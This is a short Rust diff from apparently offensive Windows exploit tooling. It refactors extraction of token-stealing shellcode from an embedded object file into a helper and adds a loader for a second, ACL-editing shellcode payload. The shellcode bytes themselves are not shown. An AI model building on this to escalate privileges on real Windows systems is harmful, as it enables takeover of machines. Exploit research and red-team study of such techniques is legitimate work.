@@ -30,8 +30,7 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
 }
 
 #[cfg(target_os = "windows")]
-pub fn token_stealing_shellcode() -> Vec<u8> {
-    let shellcode_obj = include_bytes!("token_stealing.obj");
+fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
     let obj = Object::parse(shellcode_obj).expect("[-] Failed to parse object file");
 
     let mut instructions = Vec::new();
@@ -56,6 +55,18 @@ pub fn token_stealing_shellcode() -> Vec<u8> {
     }
 
     instructions
+}
+
+#[cfg(target_os = "windows")]
+pub fn token_stealing_shellcode() -> Vec<u8> {
+    let shellcode_obj = include_bytes!("token_stealing.obj");
+    extract_shellcode_from_obj(shellcode_obj)
+}
+
+#[cfg(target_os = "windows")]
+pub fn acl_edit_shellcode() -> Vec<u8> {
+    let shellcode_obj = include_bytes!("acl_edit.obj");
+    extract_shellcode_from_obj(shellcode_obj)
 }
 
 #[cfg(target_os = "windows")]
